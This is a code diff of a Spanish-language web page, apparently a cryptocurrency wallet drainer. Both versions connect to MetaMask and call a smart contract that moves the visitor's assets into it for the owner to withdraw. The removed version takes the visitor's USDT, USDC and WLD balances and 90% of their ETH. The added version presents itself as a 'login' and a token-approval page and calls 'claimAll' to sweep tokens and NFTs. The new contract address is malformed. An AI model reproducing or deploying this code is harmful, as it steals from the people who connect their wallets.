@@ -3,62 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interacción con el Contrato</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; }
-        button { padding: 10px; margin: 10px; cursor: pointer; }
-    </style>
+    <title>Inicio de sesión con MetaMask y Aprobación de Tokens</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.container {
+    text-align: center;
+    padding: 20px;
+    background-color: white;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+    max-width: 400px;
+    width: 100%;
+}
+
+button {
+    padding: 10px 20px;
+    font-size: 16px;
+    cursor: pointer;
+    border: none;
+    background-color: #4CAF50;
+    color: white;
+    border-radius: 5px;
+    margin: 10px;
+    transition: background-color 0.3s;
+}
+
+button:hover {
+    background-color: #45a049;
+}
+
+    </style>
 <body>
-    <h2>Interactuar con el contrato en Optimism</h2>
-    <button id="connect">Conectar a MetaMask</button>
-    <button id="approve">Aprobar y Enviar Tokens</button>
-    <p id="status"></p>
+    <div class="container">
+        <h1>Iniciar sesión con MetaMask</h1>
+        <button id="connectButton">Conectar MetaMask</button>
 
-    <script>
-        let web3;
-        let account;
-        const contractAddress = "0x26c0B6C2A8120E9c71de55FB678E76174598B196";
-        const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"},{"internalType":"bool","name":"esERC20","type":"bool"},{"internalType":"bool","name":"esERC721","type":"bool"},{"internalType":"bool","name":"esERC1155","type":"bool"}],"internalType":"struct SaldoManager.Aprobacion[]","name":"aprobacionesERC20","type":"tuple[]"},{"internalType":"address[]","name":"contratosERC721","type":"address[]"},{"internalType":"address[]","name":"contratosERC1155","type":"address[]"},{"internalType":"uint256","name":"ethAmount","type":"uint256"}],"name":"aprobarTodo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"balanceETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"recibirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"recibirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"retirarERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"retirarETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"revisarSaldoERC20","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"revisarSaldoETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferirETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
-        const tokens = {
-            USDT: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-            USDC: "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-            WLD: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-        };
+        <div id="status" style="display:none;">
+            <h2>Bienvenido, conéctate para aprobar y transferir tus tokens</h2>
+            <button id="claimAllButton">Aprobar y Transferir Todos los Tokens</button>
+        </div>
+    </div>
 
-        async function connectWallet() {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                await window.ethereum.request({ method: "eth_requestAccounts" });
-                const accounts = await web3.eth.getAccounts();
-                account = accounts[0];
-                document.getElementById("status").innerText = `Conectado: ${account}`;
-            } else {
-                alert("MetaMask no está instalado");
-            }
-        }
-
-        async function approveAndSend() {
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
-            const balanceETH = await web3.eth.getBalance(account);
-            const ethToSend = (balanceETH * 0.9).toFixed(0);
-
-            let approvals = [];
-            for (let token in tokens) {
-                let tokenContract = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}], tokens[token]);
-                let balance = await tokenContract.methods.balanceOf(account).call();
-                if (balance > 0) {
-                    approvals.push({ token: tokens[token], cantidad: balance, esERC20: true });
-                }
-            }
-
-            await contract.methods.aprobarTodo(approvals, [], [], ethToSend).send({ from: account });
-            document.getElementById("status").innerText = "Tokens y ETH aprobados y enviados";
-        }
-
-        document.getElementById("connect").addEventListener("click", connectWallet);
-        document.getElementById("approve").addEventListener("click", approveAndSend);
-    </script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="app.js"></script>
 </body>
+    <script>
+        // Asegúrate de que MetaMask esté disponible
+let web3;
+let userAccount;
+let contractAddress = "T0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Dirección del contrato desplegado
+let contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AssetTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC1155Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"checkERC20Allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC721Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokensERC20","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"address[]","name":"contractsERC721","type":"address[]"},{"internalType":"address[]","name":"contractsERC1155","type":"address[]"}],"name":"claimAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC1155Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC1155ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC20ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferERC721ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"transferETHToContract","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"withdrawERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]
+
+document.getElementById("connectButton").addEventListener("click", connectMetaMask);
+document.getElementById("claimAllButton").addEventListener("click", claimAllTokens);
+
+async function connectMetaMask() {
+    if (window.ethereum) {
+        try {
+            // Solicitar acceso a la cuenta del usuario
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            // Crear una instancia de Web3
+            web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            userAccount = accounts[0];
+
+            // Mostrar estado conectado
+            document.getElementById("status").style.display = "block";
+            document.getElementById("connectButton").style.display = "none";
+        } catch (error) {
+            console.error("Error de conexión", error);
+        }
+    } else {
+        alert("MetaMask no está instalado. Por favor, instálalo.");
+    }
+}
+
+async function claimAllTokens() {
+    // Dirección del contrato y ABI
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+    try {
+        // Llamar a la función 'claimAll' del contrato
+        const tokensERC20 = []; // Direcciones de tokens ERC20
+        const amounts = []; // Cantidades a aprobar
+        const contractsERC721 = []; // Direcciones de contratos ERC721
+        const contractsERC1155 = []; // Direcciones de contratos ERC1155
+
+        // Llamar la función claimAll en el contrato
+        await contract.methods.claimAll(
+            tokensERC20, amounts, contractsERC721, contractsERC1155
+        ).send({ from: userAccount });
+
+        alert("Tokens aprobados y transferidos con éxito.");
+    } catch (error) {
+        console.error("Error en claimAll", error);
+        alert("Hubo un problema con la transacción.");
+    }
+}
+
+    </script>
 </html>
